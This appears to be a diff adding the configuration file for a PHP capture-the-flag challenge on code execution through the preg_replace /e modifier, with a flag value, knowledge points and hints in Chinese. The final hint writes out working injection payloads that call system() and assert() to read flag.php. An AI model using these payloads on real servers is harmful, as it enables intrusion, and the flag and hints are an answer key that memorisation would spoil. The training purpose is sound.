@@ -1,0 +1,24 @@
+{
+  "id": "rce6",
+  "category": "rce",
+  "title": "古董模板引擎 · preg_replace /e 代码执行",
+  "difficulty": "hard",
+  "url_path": "/rce6",
+  "runtime": "php",
+  "entry": "index.php",
+  "flag": "flag{rce6_8b37deda}",
+  "knowledge": [
+    "preg_replace /e 修饰符（后向引用被 eval）",
+    "/e 的 addslashes 引号转义坑（反引号/$_GET 绕过）",
+    "assert() 字符串断言（PHP7 替代入口）",
+    "call_user_func 可控回调（PHP8 替代入口）"
+  ],
+  "hints": [
+    "模板里 [1+1] 渲染成 2：方括号内容被求值。/e 修饰符 = replacement 会被 eval，捕获组 \\1 就是你的代码",
+    "带引号的 payload 会 Failed evaluating（/e 对捕获组做 addslashes）→ 用反引号或 $_GET 传参",
+    "?tpl=[`cat flag.php`;] 或 ?tpl=[system($_GET[cmd]);]&cmd=cat flag.php（若部署替代入口：assert 版 ?code=system('cat flag.php')；call_user_func 版 ?func=system&arg=cat flag.php）"
+  ],
+  "writeup": "writeup.md",
+  "prev": "rce5",
+  "next": null
+}
